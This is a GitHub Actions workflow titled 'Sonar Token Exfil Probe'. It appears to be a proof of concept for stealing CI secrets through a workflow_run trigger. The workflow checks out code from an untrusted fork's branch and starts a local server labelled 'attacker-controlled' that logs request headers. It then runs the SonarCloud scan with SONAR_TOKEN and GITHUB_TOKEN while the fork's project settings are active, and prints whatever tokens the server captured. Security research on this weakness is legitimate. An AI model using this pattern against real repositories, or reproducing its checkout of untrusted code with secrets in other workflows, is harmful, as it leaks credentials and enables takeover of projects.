name: Sonar Token Exfil Probe

on:
  workflow_run:
    workflows: ['Release Probe Workflow']
    types:
      - completed

jobs:
  sonar:
    name: Sonar analysis
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    permissions:
      actions: read
      pull-requests: write
      statuses: write
    steps:
      - name: Checkout project
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.0
        with:
          repository: ${{ github.event.workflow_run.head_repository.full_name }}
          ref: ${{ github.event.workflow_run.head_branch }}
          fetch-depth: 0

      - name: Show project settings the scanner will read
        run: |
          echo "WORKSPACE=$(pwd)"
          cat sonar-project.properties

      - name: Start attacker-controlled log server
        run: |
          mkdir -p /tmp/sonar-test
          : > /tmp/sonar-test/requests.log
          cat > /tmp/sonar-test/srv.py <<'PY'
          import json
          from http.server import BaseHTTPRequestHandler, HTTPServer

          class H(BaseHTTPRequestHandler):
              def log_message(self, *a):
                  pass
              def _handle(self):
                  with open('/tmp/sonar-test/requests.log', 'a') as f:
                      f.write(f"{self.command} {self.path}\n")
                      for k, v in self.headers.items():
                          f.write(f"  {k}: {v}\n")
                      f.write("---\n")
                  if self.path.startswith('/api/server/version') or self.path.startswith('/api/v2/analysis/version'):
                      body = b'10.6.0.12345'
                  elif self.path.startswith('/api/system/status'):
                      body = b'{"id":"x","version":"10.6.0","status":"UP"}'
                  else:
                      body = b'{}'
                  self.send_response(200)
                  self.send_header('Content-Type', 'application/json')
                  self.send_header('Content-Length', str(len(body)))
                  self.end_headers()
                  self.wfile.write(body)
              do_GET = _handle
              do_POST = _handle

          HTTPServer(('127.0.0.1', 18080), H).serve_forever()
          PY
          nohup python3 /tmp/sonar-test/srv.py > /tmp/sonar-test/srv.out 2>&1 &
          sleep 2
          echo "server started"

      - name: Run SonarCloud scan with attacker-controlled project settings
        continue-on-error: true
        uses: SonarSource/sonarqube-scan-action@a31c9398be7ace6bbfaf30c0bd5d415f843d45e9
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

      - name: Show what the attacker-controlled host received
        if: always()
        run: |
          echo "===== CAPTURED REQUESTS ====="
          cat /tmp/sonar-test/requests.log
